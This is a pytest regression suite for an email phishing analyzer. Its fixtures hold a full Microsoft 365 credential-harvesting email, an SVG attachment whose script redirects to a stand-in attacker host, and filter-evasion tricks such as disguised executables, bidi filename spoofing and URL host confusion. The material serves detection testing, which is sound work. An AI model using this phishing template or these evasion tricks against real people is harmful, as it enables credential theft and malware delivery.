"""
Regression tests for the detection and rate-limit bypasses found by the second
adversarial audit.

Each test corresponds to a bypass that was demonstrated working against the
code before these fixes. The headline case is `test_credential_harvester_...`:
an audit agent built a complete Microsoft-365 phishing email with two
weaponised attachments and measured it at **0/100, "APPEARS LEGITIMATE"**.
"""
import pytest
from unittest.mock import patch

from app import create_app, limiter, rate_limit_key
from app.config import TestingConfig
from app.services.attachment_analyzer import AttachmentAnalyzerService
from app.services.content_analyzer import ContentAnalyzerService
from app.services.email_analyzer import EmailAnalyzerService
from app.services.email_parser import EmailParserService, attachment_extension
from app.services.url_analyzer import URLAnalyzerService


# The audit's proof-of-concept, reproduced verbatim.
PHISHING_POC = (
    b'From: "Microsoft 365 Message Center" <no-reply@secure-update.com>\r\n'
    b'To: victim@company.example\r\n'
    b'Subject: Your mailbox could not finish syncing\r\n'
    b'Date: Fri, 07 Aug 2026 09:12:04 +0000\r\n'
    b'Message-ID: <2026080709.1@secure-update.com>\r\n'
    b'MIME-Version: 1.0\r\n'
    b'Content-Type: multipart/mixed; boundary="b1"\r\n'
    b'\r\n'
    b'--b1\r\n'
    b'Content-Type: text/html; charset=utf-8\r\n'
    b'\r\n'
    b'<html><body>\r\n'
    b'<img src="//microsoft.com.secure-update.com/o365/ms.png">\r\n'
    b'<p>Mail delivery is paused. Enter your work sign-in details below to\r\n'
    b'resume delivery of the 4 messages currently held.</p>\r\n'
    b'<form method="post" action="//microsoft.com.secure-update.com/o365/s">\r\n'
    b'  <input type="email" name="u" placeholder="Work e-mail">\r\n'
    b'  <input type="text" name="p" style="-webkit-text-security:disc">\r\n'
    b'</form>\r\n'
    b'<p><a href="//microsoft.com.secure-update.com/o365/s">Resume mail delivery</a></p>\r\n'
    b'</body></html>\r\n'
    b'--b1\r\n'
    b'Content-Type: application/octet-stream; name="Mailbox_Sync.lnk"\r\n'
    b'Content-Transfer-Encoding: base64\r\n'
    b'Content-Disposition: attachment; filename="Mailbox_Sync.lnk"\r\n'
    b'\r\n'
    b'TAAAAAEUAgAAAAAAwAAAAAAAAEY=\r\n'
    b'--b1\r\n'
    b'Content-Type: image/svg+xml; name="Sync_Report.svg"\r\n'
    b'Content-Transfer-Encoding: base64\r\n'
    b'Content-Disposition: attachment; filename="Sync_Report.svg"\r\n'
    b'\r\n'
    b'PHN2Zz48c2NyaXB0PmxvY2F0aW9uPSdodHRwczovL2V2aWwudGxkJzwvc2NyaXB0Pjwvc3ZnPg==\r\n'
    b'--b1--\r\n'
)


def _analyze(raw, *, spf='v=spf1 include:_spf.x ~all', dmarc='v=DMARC1; p=reject',
             creation='2011-03-04T00:00:00', whitelist=None):
    """Run the real pipeline with plausible DNS/WHOIS answers."""
    whois = {
        'domain': 'x', 'registrar': 'R', 'creation_date': creation,
        'expiration_date': None, 'updated_date': None, 'status': None,
        'name_servers': [],
    } if creation else None
    with patch('app.services.dns_checker.DNSCheckerService.check_spf', return_value=spf), \
         patch('app.services.dns_checker.DNSCheckerService.check_dmarc', return_value=dmarc), \
         patch('app.services.dns_checker.DNSCheckerService.check_dkim', return_value=None), \
         patch('app.services.whois_service.WhoisService.lookup', return_value=whois):
        parsed = EmailParserService().parse_email(raw, 'case.eml')
        return EmailAnalyzerService(whitelist_domains=whitelist or []).analyze(parsed)


class TestCredentialHarvesterDetection:
    """
    The audit measured this exact email at score 0, level 'low', verdict
    "APPEARS LEGITIMATE - Standard security measures apply". Every scored
    signal was individually dodgeable.
    """

    def test_credential_harvester_is_not_reported_as_legitimate(self):
        result = _analyze(PHISHING_POC)
        assessment = result['risk_assessment']
        assert assessment['level'] in ('high', 'critical'), (
            f"scored {assessment['score']}/100 as {assessment['level']}: "
            f"{assessment['verdict']}"
        )
        assert assessment['score'] >= 50

    def test_masked_password_field_is_detected(self):
        """
        <input type="text" style="-webkit-text-security:disc"> renders as a
        password box but contains none of the words the keyword scan looked for.
        """
        result = ContentAnalyzerService().analyze(
            '', '<form><input type="text" style="-webkit-text-security:disc"></form>')
        assert result['credential_inputs'] == 1

    @pytest.mark.parametrize('markup', [
        '<input type="password">',
        '<input type="text" autocomplete="current-password">',
        '<input type="text" style="-webkit-text-security: disc">',
    ])
    def test_all_password_field_forms_detected(self, markup):
        assert ContentAnalyzerService().analyze('', f'<form>{markup}</form>')['credential_inputs'] >= 1

    def test_form_action_is_recorded(self):
        result = ContentAnalyzerService().analyze('', '<form action="//evil.tld/x"></form>')
        assert result['external_form_actions']

    def test_credential_form_raises_a_critical_suspicion(self):
        result = _analyze(PHISHING_POC)
        severities = {s['severity'] for s in result['suspicions']}
        assert 'critical' in severities


class TestNoFalsePositives:
    """
    The other half of the job. A detector that flags ordinary mail as high risk
    gets ignored, and an ignored detector protects nobody — so the legitimate
    cases are asserted as tightly as the malicious one.

    These caught two real regressions: `invoice.pdf` matches a filename keyword,
    and a newsletter's unsubscribe link contains "url=". Both produced a
    'suspicious' entry which, floored at the worst suspicion severity, promoted
    routine mail to 'high'.
    """

    LEGITIMATE = {
        'plain personal mail': (
            b'From: Dana <dana@example.com>\r\nTo: y@c.com\r\nSubject: Lunch tomorrow?\r\n'
            b'Date: Mon, 3 Mar 2025 10:00:00 +0200\r\n'
            b'Authentication-Results: mx; spf=pass; dkim=pass; dmarc=pass\r\n'
            b'Content-Type: text/plain\r\n\r\nAre you free at 1pm?\r\n'
        ),
        'transactional receipt': (
            b'From: receipts@example.com\r\nTo: y@c.com\r\nSubject: Your receipt\r\n'
            b'Date: Mon, 3 Mar 2025 10:00:00 +0200\r\n'
            b'Authentication-Results: mx; spf=pass; dkim=pass; dmarc=pass\r\n'
            b'Content-Type: text/html\r\n\r\n'
            b'<html><body><h1>Receipt</h1>'
            b'<a href="https://example.com/orders/123">View order</a></body></html>\r\n'
        ),
        'newsletter with tracking pixel': (
            b'From: news@example.com\r\nTo: y@c.com\r\nSubject: March newsletter\r\n'
            b'Date: Mon, 3 Mar 2025 10:00:00 +0200\r\n'
            b'Authentication-Results: mx; spf=pass; dkim=pass; dmarc=pass\r\n'
            b'Content-Type: text/html\r\n\r\n'
            b'<html><body><p>Dear customer, here is our update.</p>'
            b'<a href="https://click.example.com/unsub?url=https://example.com/u">Unsubscribe</a>'
            b'<img src="https://track.example.com/p.gif" style="display:none">'
            b'</body></html>\r\n'
        ),
        'invoice with a PDF attached': (
            b'From: accounts@example.com\r\nTo: y@c.com\r\nSubject: Invoice 4471\r\n'
            b'Date: Mon, 3 Mar 2025 10:00:00 +0200\r\n'
            b'Authentication-Results: mx; spf=pass; dkim=pass; dmarc=pass\r\n'
            b'Content-Type: multipart/mixed; boundary="X"\r\n\r\n'
            b'--X\r\nContent-Type: text/plain\r\n\r\nInvoice attached.\r\n'
            b'--X\r\nContent-Type: application/pdf; name="invoice.pdf"\r\n'
            b'Content-Disposition: attachment; filename="invoice.pdf"\r\n\r\n'
            b'JVBERi0xLjQK\r\n--X--\r\n'
        ),
    }

    @pytest.mark.parametrize('name', list(LEGITIMATE))
    def test_legitimate_mail_is_not_escalated(self, name):
        result = _analyze(self.LEGITIMATE[name], creation='1995-08-14T00:00:00')
        level = result['risk_assessment']['level']
        assert level in ('low', 'medium'), (
            f"{name} scored {result['risk_assessment']['score']}/100 as {level}: "
            f"{[s['message'] for s in result['suspicions']]}"
        )

    def test_a_pdf_named_invoice_is_not_high_risk(self):
        """'invoice' is in the suspicious-filename keyword list."""
        result = _analyze(self.LEGITIMATE['invoice with a PDF attached'],
                          creation='1995-08-14T00:00:00')
        assert result['risk_assessment']['level'] == 'low'

    def test_separation_between_legitimate_and_phishing_is_wide(self):
        legit = _analyze(self.LEGITIMATE['transactional receipt'],
                         creation='1995-08-14T00:00:00')['risk_assessment']['score']
        phish = _analyze(PHISHING_POC)['risk_assessment']['score']
        assert phish - legit >= 40, f'legit={legit} phishing={phish} — too close to be useful'


class TestAttachmentCoverage:
    """The deny-list omitted the vectors actually in use."""

    @pytest.mark.parametrize('extension', [
        'lnk', 'url', 'scf', 'settingcontent-ms', 'library-ms',   # shortcuts
        'svg', 'chm', 'mhtml', 'xsl',                             # active markup
        'xll', 'wll', 'ppam', 'xlam', 'iqy', 'slk',               # office code
        'cpl', 'msc', 'reg', 'vbe', 'jse', 'sct', 'jnlp', 'msix', # executables
        'vhd', 'vhdx', 'wsb', 'cab',                              # containers
    ])
    def test_dangerous_extension_is_flagged(self, extension):
        result = AttachmentAnalyzerService().analyze_single_attachment({
            'filename': f'file.{extension}', 'extension': extension,
            'content_type': 'application/octet-stream', 'size': 50_000,
        })
        assert result['is_suspicious'], f'.{extension} scored clean'

    @pytest.mark.parametrize('extension', ['pdf', 'docx', 'xlsx', 'jpg', 'png', 'txt', 'mp4'])
    def test_ordinary_attachment_stays_clean(self, extension):
        result = AttachmentAnalyzerService().analyze_single_attachment({
            'filename': f'file.{extension}', 'extension': extension,
            'content_type': 'application/octet-stream', 'size': 50_000,
        })
        assert not result['is_suspicious'], f'.{extension} false-positived'

    def test_unknown_extension_is_reported_not_assumed_safe(self):
        result = AttachmentAnalyzerService().analyze_single_attachment({
            'filename': 'file.q7zx', 'extension': 'q7zx',
            'content_type': 'application/octet-stream', 'size': 50_000,
        })
        assert 'unrecognised_extension' in result['issues']


class TestContentSniffing:
    """
    An extension list can only describe what a file is *called*. An .exe named
    holiday.jpg passes every name-based check ever written, so the leading
    bytes are checked against the declared extension.
    """

    @staticmethod
    def _email_with(filename: str, payload: bytes) -> bytes:
        import base64
        encoded = base64.b64encode(payload)
        name = filename.encode()
        return (
            b'From: a@b.com\r\nTo: c@d.com\r\nSubject: t\r\n'
            b'Date: Mon, 1 Jan 2024 00:00:00 +0000\r\n'
            b'Content-Type: multipart/mixed; boundary="X"\r\n\r\n--X\r\n'
            b'Content-Type: application/octet-stream; name="' + name + b'"\r\n'
            b'Content-Transfer-Encoding: base64\r\n'
            b'Content-Disposition: attachment; filename="' + name + b'"\r\n\r\n'
            + encoded + b'\r\n--X--\r\n'
        )

    @pytest.mark.parametrize('filename,payload,expected', [
        ('holiday.jpg', b'MZ\x90\x00\x03' + b'A' * 60, 'pe_executable'),
        ('report.pdf', b'PK\x03\x04\x14\x00' + b'A' * 60, 'zip_container'),
        ('photo.png', b'L\x00\x00\x00\x01\x14\x02\x00' + b'A' * 60, 'windows_shortcut'),
        ('notes.txt', b'\x7fELF\x02\x01' + b'A' * 60, 'elf_executable'),
        ('invoice.pdf', b'\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1' + b'A' * 60, 'ole_document'),
    ])
    def test_disguised_payload_is_detected(self, filename, payload, expected):
        parsed = EmailParserService().parse_email(self._email_with(filename, payload), 'x.eml')
        assert parsed['attachments'][0]['content_mismatch'] == expected

    @pytest.mark.parametrize('filename,payload', [
        ('setup.exe', b'MZ\x90\x00\x03' + b'A' * 60),      # honest executable
        ('real.docx', b'PK\x03\x04\x14\x00' + b'A' * 60),  # OOXML really is a zip
        ('doc.pdf', b'%PDF-1.4\n' + b'A' * 60),
        ('archive.zip', b'PK\x03\x04' + b'A' * 60),
        ('legacy.doc', b'\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1' + b'A' * 60),
    ])
    def test_honest_files_are_not_flagged(self, filename, payload):
        parsed = EmailParserService().parse_email(self._email_with(filename, payload), 'x.eml')
        assert parsed['attachments'][0]['content_mismatch'] is None

    def test_disguised_executable_is_scored_critical(self):
        result = AttachmentAnalyzerService().analyze_single_attachment({
            'filename': 'holiday.jpg', 'extension': 'jpg',
            'content_type': 'image/jpeg', 'size': 90_000,
            'content_mismatch': 'pe_executable',
        })
        assert result['severity'] == 'critical'
        assert result['is_suspicious']

    def test_disguised_attachment_raises_the_email_risk(self):
        payload = self._email_with('holiday.jpg', b'MZ\x90\x00\x03' + b'A' * 60)
        result = _analyze(payload, spf=None, dmarc=None, creation=None)
        assert result['risk_assessment']['level'] in ('high', 'critical')

    def test_sniffing_cost_is_bounded(self):
        """Only a fixed prefix is decoded, never the whole attachment."""
        import time

        payload = self._email_with('big.jpg', b'MZ' + b'A' * (4 * 1024 * 1024))
        started = time.monotonic()
        EmailParserService().parse_email(payload, 'x.eml')
        assert time.monotonic() - started < 3


class TestExtensionParsingBypasses:
    def test_trailing_dot_does_not_erase_the_extension(self):
        """
        os.path.splitext('payload.exe.') returns ('payload.exe', '.'), so
        .lstrip('.') gave ''. Windows strips trailing dots on save, producing a
        live payload.exe from a file the analyzer called clean.
        """
        assert attachment_extension('payload.exe.') == 'exe'
        assert attachment_extension('payload.exe...  ') == 'exe'

    def test_long_filename_keeps_its_extension(self):
        """Truncating to 255 chars before splitting removed the extension."""
        assert attachment_extension('R' * 300 + '.exe') == 'exe'

    def test_bidi_and_zero_width_characters_are_stripped(self):
        assert attachment_extension('invoice‮gnp.exe') == 'exe'
        assert attachment_extension('doc​.lnk') == 'lnk'

    def test_extension_survives_the_full_parse_path(self):
        parsed = EmailParserService().parse_email(PHISHING_POC, 'x.eml')
        extensions = {a['extension'] for a in parsed['attachments']}
        assert 'lnk' in extensions
        assert 'svg' in extensions


class TestUrlHostConfusion:
    def test_backslash_does_not_launder_the_host(self):
        """
        Python treats '\\' as an ordinary character, so
        'https://evil.example\\.microsoft.com/x' parsed as host
        'evil.example\\.microsoft.com' -> registrable 'microsoft.com'. Browsers
        follow WHATWG and navigate to evil.example. One character made a
        hostile link score as the sender's own domain.
        """
        result = URLAnalyzerService().analyze_single_url(
            'https://evil.example\\.microsoft.com/x', sender_domain='microsoft.com')
        assert result['domain'] == 'evil.example'
        assert 'host_parser_confusion' in result['issues']
        assert result['is_suspicious']

    def test_punycode_detected_in_any_label(self):
        """Only the first label was checked, so a subdomain hid it."""
        result = URLAnalyzerService().analyze_single_url('https://www.xn--pple-43d.com/login')
        assert 'punycode_domain' in result['issues']

    def test_brand_in_subdomain_is_flagged(self):
        result = URLAnalyzerService().analyze_single_url(
            'https://microsoft.com.secure-update.com/o365/s')
        assert result['domain'] == 'secure-update.com'
        assert 'brand_impersonation_in_host' in result['issues']

    def test_the_brands_own_domain_is_not_flagged(self):
        result = URLAnalyzerService().analyze_single_url('https://login.microsoft.com/ok')
        assert 'brand_impersonation_in_host' not in result['issues']

    def test_invalid_host_characters_flagged(self):
        result = URLAnalyzerService().analyze_single_url('https://ev il.com/x')
        assert result['issues']


class TestAuthenticationHonesty:
    def test_omitting_auth_header_is_not_cheaper_than_reporting_failure(self):
        """
        A missing Authentication-Results header scored 0 while an honest
        'fail' scored 30 — deleting one header was the cheapest score
        reduction available.

        Compares the SAME message three ways rather than asserting `score > 0`.
        The old assertion passed with the fix reverted, because the message's
        absent SPF and DMARC records contributed 16 points on their own.
        """
        base = (b'From: a@evil-test.com\r\nTo: b@c.com\r\nSubject: t\r\n'
                b'Date: Mon, 1 Jan 2024 00:00:00 +0000\r\n')

        def score(auth_header):
            header = (b'Authentication-Results: ' + auth_header + b'\r\n') if auth_header else b''
            return _analyze(base + header + b'\r\nbody',
                            spf=None, dmarc=None, creation=None)['risk_assessment']['score']

        silent = score(None)
        honest_failure = score(b'mx; spf=fail; dkim=fail; dmarc=fail')
        claimed_pass = score(b'mx; spf=pass; dkim=pass; dmarc=pass')

        # A claimed pass must buy NOTHING. The sender writes this header, so
        # `spf=pass` is an assertion the analyzer cannot check — worth exactly
        # as much as saying nothing. While it earned a discount, adding one
        # forged line to a phishing sample was worth 15 points.
        assert claimed_pass == silent, (
            f'claiming a pass ({claimed_pass}) scored better than silence '
            f'({silent}) — an unverifiable claim is buying a discount'
        )
        # An admitted failure is the one trustworthy signal here: nobody forges
        # a failure, so it must still cost more than either.
        assert honest_failure > silent, (
            f'an admitted authentication failure ({honest_failure}) scored no '
            f'worse than silence ({silent})'
        )

    def test_self_reported_results_are_marked_unverified(self):
        result = _analyze(PHISHING_POC)
        assert result['authentication']['auth_analysis_is_self_reported'] is True

    def test_missing_dns_records_are_scored(self):
        base = (b'From: a@evil-test.com\r\nTo: b@c.com\r\nSubject: t\r\n'
                b'Date: Mon, 1 Jan 2024 00:00:00 +0000\r\n\r\nbody')
        no_records = _analyze(base, spf=None, dmarc=None, creation=None)
        with_records = _analyze(base, creation=None)
        assert no_records['risk_assessment']['score'] > with_records['risk_assessment']['score']


class TestWhitelistScope:
    def test_free_mail_providers_are_not_whitelisted_by_default(self):
        """
        Their SPF/DMARC authenticate the provider, not the sender's intent —
        anyone can open an account and send authenticated phishing.
        """
        from app.config import Config

        lowered = [d.lower() for d in Config.WHITELIST_DOMAINS]
        for provider in ('gmail.com', 'outlook.com', 'yahoo.com', 'hotmail.com'):
            assert provider not in lowered, f'{provider} still capped at low risk'


class TestIPv6RateLimitAggregation:
    """
    A single host is routinely delegated a /64 — 2^64 addresses it genuinely
    owns. The audit measured 60 uploads from one /64 producing zero 429s.
    """

    @pytest.fixture
    def client(self):
        class C(TestingConfig):
            RATELIMIT_ENABLED = True

        app = create_app(C)
        with app.app_context():
            limiter.reset()
        yield app.test_client()
        with app.app_context():
            limiter.reset()

    def test_one_slash_64_shares_a_bucket(self, client):
        statuses = [
            client.post('/api/analyze',
                        headers={'X-Forwarded-For': f'2001:db8:dead:beef::{i:x}'}).status_code
            for i in range(1, 41)
        ]
        assert 429 in statuses, '40 addresses in one /64 were never rate limited'

    def test_a_different_slash_64_is_a_different_bucket(self, client):
        for i in range(1, 41):
            client.post('/api/analyze',
                        headers={'X-Forwarded-For': f'2001:db8:dead:beef::{i:x}'})
        other = client.post('/api/analyze',
                            headers={'X-Forwarded-For': '2001:db8:dead:cafe::1'})
        assert other.status_code != 429, 'unrelated /64 was caught in the same bucket'

    def test_ipv4_keeps_full_address_granularity(self, client):
        first = [client.post('/api/analyze',
                             headers={'X-Forwarded-For': '203.0.113.5'}).status_code
                 for _ in range(13)]
        assert 429 in first
        other = client.post('/api/analyze', headers={'X-Forwarded-For': '203.0.113.6'})
        assert other.status_code != 429

    def test_key_function_aggregates_correctly(self):
        """
        Uses environ_base rather than an X-Forwarded-For header: a
        test_request_context does not pass through the WSGI stack, so ProxyFix
        never runs and the header would be ignored.
        """
        app = create_app(TestingConfig)
        cases = [
            ('2001:db8:dead:beef::5', '2001:db8:dead:beef::/64'),
            ('2001:db8:dead:beef:ffff:ffff:ffff:ffff', '2001:db8:dead:beef::/64'),
            ('2001:db8:dead:cafe::1', '2001:db8:dead:cafe::/64'),
            ('203.0.113.5', '203.0.113.5'),
        ]
        for address, expected in cases:
            with app.test_request_context(environ_base={'REMOTE_ADDR': address}):
                assert rate_limit_key() == expected, address


class TestChunkedBodyLimit:
    def test_chunked_body_cannot_skip_the_json_size_cap(self):
        """
        The cap read Content-Length only, and a chunked request has none — so
        the check was skipped entirely.
        """
        app = create_app(TestingConfig)
        client = app.test_client()
        oversized = b'{"url":"https://example.com","pad":"' + b'x' * 40000 + b'"}'
        response = client.post(
            '/api/analyze/url',
            data=oversized,
            headers={'Transfer-Encoding': 'chunked', 'Content-Type': 'application/json'},
        )
        assert response.status_code in (400, 413), response.status_code
